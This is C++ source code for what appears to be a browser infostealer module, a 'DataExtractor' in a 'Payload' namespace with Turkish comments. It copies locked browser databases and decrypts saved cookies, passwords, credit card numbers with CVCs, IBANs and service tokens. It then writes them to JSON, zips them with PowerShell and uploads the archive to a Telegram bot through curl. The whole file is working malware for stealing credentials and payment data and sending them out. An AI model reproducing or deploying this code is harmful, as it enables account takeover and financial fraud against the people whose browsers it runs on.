
#include "data_extractor.hpp"
#include "handle_duplicator.hpp"
#include "../crypto/aes_gcm.hpp"
#include <fstream>
#include <sstream>
#include <iomanip>
#include <map>
#include <vector>
#include <filesystem>
#include <cstdlib>

namespace Payload {

    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::filesystem::path& outputBase)
        : m_pipe(pipe), m_key(key), m_outputBase(outputBase) {}

    sqlite3* DataExtractor::OpenDatabase(const std::filesystem::path& dbPath) {
        sqlite3* db = nullptr;
        std::string uri = "file:" + dbPath.string() + "?nolock=1";
        if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK) {
            if (db) sqlite3_close(db);
            return nullptr;
        }
        return db;
    }

    sqlite3* DataExtractor::OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath) {
        sqlite3* db = OpenDatabase(dbPath);
        if (db) {
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db, "SELECT 1", -1, &stmt, nullptr) == SQLITE_OK) {
                if (sqlite3_step(stmt) == SQLITE_ROW) {
                    sqlite3_finalize(stmt);
                    return db;
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
            db = nullptr;
        }

        HandleDuplicator duplicator;

        auto tempDir = m_outputBase / ".temp";
        auto tempDbPath = duplicator.CopyLockedFile(dbPath, tempDir);

        if (!tempDbPath) {
            return nullptr;
        }

        m_tempFiles.push_back(*tempDbPath);

        return OpenDatabase(*tempDbPath);
    }

    void DataExtractor::CleanupTempFiles() {
        for (const auto& tempFile : m_tempFiles) {
            try {
                if (std::filesystem::exists(tempFile)) {
                    std::filesystem::remove(tempFile);
                }
            } catch (...) {}
        }
        m_tempFiles.clear();

        try {
            auto tempDir = m_outputBase / ".temp";
            if (std::filesystem::exists(tempDir) && std::filesystem::is_empty(tempDir)) {
                std::filesystem::remove(tempDir);
            }
        } catch (...) {}
    }

    void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
        m_pipe.Log("PROFILE:" + profilePath.filename().string());

        try {
            auto cookiePath = profilePath / "Network" / "Cookies";
            if (std::filesystem::exists(cookiePath)) {
                if (auto db = OpenDatabaseWithHandleDuplication(cookiePath)) {
                    ExtractCookies(db, m_outputBase / browserName / profilePath.filename() / "cookies.json");
                    sqlite3_close(db);
                }
            }
        } catch(...) {}

        try {
            auto loginPath = profilePath / "Login Data";
            if (std::filesystem::exists(loginPath)) {
                if (auto db = OpenDatabaseWithHandleDuplication(loginPath)) {
                    ExtractPasswords(db, m_outputBase / browserName / profilePath.filename() / "passwords.json");
                    sqlite3_close(db);
                }
            }
        } catch(...) {}

        try {
            auto loginAccountPath = profilePath / "Login Data For Account";
            if (std::filesystem::exists(loginAccountPath)) {
                if (auto db = OpenDatabaseWithHandleDuplication(loginAccountPath)) {
                    ExtractPasswords(db, m_outputBase / browserName / profilePath.filename() / "passwords_account.json");
                    sqlite3_close(db);
                }
            }
        } catch(...) {}

        try {
            auto webDataPath = profilePath / "Web Data";
            if (std::filesystem::exists(webDataPath)) {
                if (auto db = OpenDatabaseWithHandleDuplication(webDataPath)) {
                    ExtractCards(db, m_outputBase / browserName / profilePath.filename() / "cards.json");
                    ExtractIBANs(db, m_outputBase / browserName / profilePath.filename() / "iban.json");
                    ExtractTokens(db, m_outputBase / browserName / profilePath.filename() / "tokens.json");
                    sqlite3_close(db);
                }
            }
        } catch(...) {}

        CleanupTempFiles();
    }

    void DataExtractor::ExtractCookies(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies";
        
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        int total = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            total++;
            const void* blob = sqlite3_column_blob(stmt, 6);
            int blobLen = sqlite3_column_bytes(stmt, 6);
            
            if (blob && blobLen > 0) {
                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
                
                if (decrypted && !decrypted->empty()) {
                    std::string val;
                    if (decrypted->size() > 32) {
                        val = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
                    } else {
                        val = std::string((char*)decrypted->data(), decrypted->size());
                    }

                    std::stringstream ss;
                    ss << "{\"host\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                       << "\"name\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"path\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 2)) << "\","
                       << "\"is_secure\":" << (sqlite3_column_int(stmt, 3) ? "true" : "false") << ","
                       << "\"is_httponly\":" << (sqlite3_column_int(stmt, 4) ? "true" : "false") << ","
                       << "\"expires\":" << sqlite3_column_int64(stmt, 5) << ","
                       << "\"value\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) {
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            }
            out << "]";
            m_pipe.Log("COOKIES:" + std::to_string(entries.size()) + ":" + std::to_string(total));
        }
    }

    void DataExtractor::ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
        
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 2);
            int blobLen = sqlite3_column_bytes(stmt, 2);
            
            if (blob && blobLen > 0) {
                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
                
                if (decrypted) {
                    std::string val((char*)decrypted->data(), decrypted->size());
                    std::stringstream ss;
                    ss << "{\"url\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                       << "\"user\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"pass\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) {
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            }
            out << "]";
            m_pipe.Log("PASSWORDS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractCards(sqlite3* db, const std::filesystem::path& outFile) {
        std::map<std::string, std::string> cvcMap;
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc", -1, &stmt, nullptr) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* guid = (const char*)sqlite3_column_text(stmt, 0);
                const void* blob = sqlite3_column_blob(stmt, 1);
                int len = sqlite3_column_bytes(stmt, 1);
                if (guid && blob && len > 0) {
                    std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                    auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                    if (dec) cvcMap[guid] = std::string((char*)dec->data(), dec->size());
                }
            }
            sqlite3_finalize(stmt);
        }

        if (sqlite3_prepare_v2(db, "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* guid = (const char*)sqlite3_column_text(stmt, 0);
            const void* blob = sqlite3_column_blob(stmt, 4);
            int len = sqlite3_column_bytes(stmt, 4);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string num((char*)dec->data(), dec->size());
                    std::string cvc = (guid && cvcMap.count(guid)) ? cvcMap[guid] : "";
                    
                    std::stringstream ss;
                    ss << "{\"name\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"month\":" << sqlite3_column_int(stmt, 2) << ","
                       << "\"year\":" << sqlite3_column_int(stmt, 3) << ","
                       << "\"number\":\"" << EscapeJson(num) << "\","
                       << "\"cvc\":\"" << EscapeJson(cvc) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("CARDS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractIBANs(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT value_encrypted, nickname FROM local_ibans", -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 0);
            int len = sqlite3_column_bytes(stmt, 0);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string val((char*)dec->data(), dec->size());
                    std::stringstream ss;
                    ss << "{\"nickname\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"iban\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("IBANS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractTokens(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        bool hasBindingKey = true;
        
        if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token, binding_key FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) {
            hasBindingKey = false;
            if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) return;
        }

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 1);
            int len = sqlite3_column_bytes(stmt, 1);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string val((char*)dec->data(), dec->size());
                    std::string bindingKey = "";
                    
                    if (hasBindingKey) {
                        const void* bKeyBlob = sqlite3_column_blob(stmt, 2);
                        int bKeyLen = sqlite3_column_bytes(stmt, 2);
                        if (bKeyBlob && bKeyLen > 0) {
                            std::vector<uint8_t> encKey((uint8_t*)bKeyBlob, (uint8_t*)bKeyBlob + bKeyLen);
                            auto decKey = Crypto::AesGcm::Decrypt(m_key, encKey);
                            if (decKey) {
                                bindingKey = std::string((char*)decKey->data(), decKey->size());
                            }
                        }
                    }

                    std::stringstream ss;
                    ss << "{\"service\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                       << "\"token\":\"" << EscapeJson(val) << "\","
                       << "\"binding_key\":\"" << EscapeJson(bindingKey) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("TOKENS:" + std::to_string(entries.size()));
        }
    }

    std::string DataExtractor::EscapeJson(const std::string& s) {
        std::ostringstream o;
        for (char c : s) {
            if (c == '"') o << "\\\"";
            else if (c == '\\') o << "\\\\";
            else if (c == '\b') o << "\\b";
            else if (c == '\f') o << "\\f";
            else if (c == '\n') o << "\\n";
            else if (c == '\r') o << "\\r";
            else if (c == '\t') o << "\\t";
            else if ('\x00' <= c && c <= '\x1f') o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
            else o << c;
        }
        return o.str();
    }

    // ========== TELEGRAM ZIP GÖNDERME ==========

    void DataExtractor::SendAllToTelegram(const std::string& botToken, const std::string& chatId) {
        if (!std::filesystem::exists(m_outputBase) || std::filesystem::is_empty(m_outputBase)) {
            m_pipe.Log("TELEGRAM: No data to send.");
            return;
        }

        std::filesystem::path tempDir = m_outputBase / ".telegram_temp";
        std::filesystem::create_directories(tempDir);

        // Tüm JSON dosyalarını temp klasörüne kopyala
        for (const auto& entry : std::filesystem::recursive_directory_iterator(m_outputBase)) {
            if (entry.is_regular_file() && entry.path().extension() == ".json") {
                std::filesystem::path relPath = std::filesystem::relative(entry.path(), m_outputBase);
                std::filesystem::path destPath = tempDir / relPath;
                std::filesystem::create_directories(destPath.parent_path());
                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing);
            }
        }

        // ZIP oluştur
        std::filesystem::path zipPath = m_outputBase / "output.zip";
        std::string zipCmd = "powershell -Command \"Compress-Archive -Path '" + tempDir.string() + "\\*' -DestinationPath '" + zipPath.string() + "' -Force\"";
        int result = system(zipCmd.c_str());
        if (result != 0) {
            m_pipe.Log("TELEGRAM: ZIP creation failed.");
            std::filesystem::remove_all(tempDir);
            return;
        }

        // ZIP dosyasını oku
        std::ifstream file(zipPath, std::ios::binary);
        if (!file.is_open()) {
            m_pipe.Log("TELEGRAM: Failed to open ZIP file.");
            std::filesystem::remove_all(tempDir);
            std::filesystem::remove(zipPath);
            return;
        }
        std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        // Telegram'a gönder (curl ile multipart/form-data)
        std::string url = "https://api.telegram.org/bot" + botToken + "/sendDocument";
        std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";

        std::filesystem::path bodyFile = m_outputBase / ".telegram_body.txt";
        std::ofstream body(bodyFile, std::ios::binary);
        if (!body.is_open()) {
            m_pipe.Log("TELEGRAM: Failed to create body file.");
            std::filesystem::remove_all(tempDir);
            std::filesystem::remove(zipPath);
            return;
        }
        body << "--" << boundary << "\r\n";
        body << "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" << chatId << "\r\n";
        body << "--" << boundary << "\r\n";
        body << "Content-Disposition: form-data; name=\"document\"; filename=\"output.zip\"\r\n";
        body << "Content-Type: application/zip\r\n\r\n";
        body.write(buffer.data(), buffer.size());
        body << "\r\n--" << boundary << "--\r\n";
        body.close();

        std::string curlCmd = "curl -s -X POST \"" + url + "\" -H \"Content-Type: multipart/form-data; boundary=" + boundary + "\" --data-binary @" + bodyFile.string();
        int curlResult = system(curlCmd.c_str());

        std::filesystem::remove(bodyFile);
        std::filesystem::remove(zipPath);
        std::filesystem::remove_all(tempDir);

        if (curlResult == 0) {
            m_pipe.Log("TELEGRAM: Data sent successfully.");
        } else {
            m_pipe.Log("TELEGRAM: Send failed (curl error).");
        }
    }

}